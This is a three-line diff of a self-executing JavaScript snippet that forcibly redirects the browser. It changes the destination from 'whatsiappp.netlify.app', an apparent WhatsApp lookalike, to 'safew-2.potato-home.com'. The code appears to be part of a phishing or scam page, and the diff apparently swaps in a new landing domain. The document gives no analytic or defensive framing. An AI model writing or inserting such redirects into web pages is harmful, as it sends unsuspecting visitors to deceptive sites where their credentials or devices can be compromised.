@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://whatsiappp.netlify.app';
+    window['location'] = 'http://safew-2.potato-home.com';
 })();
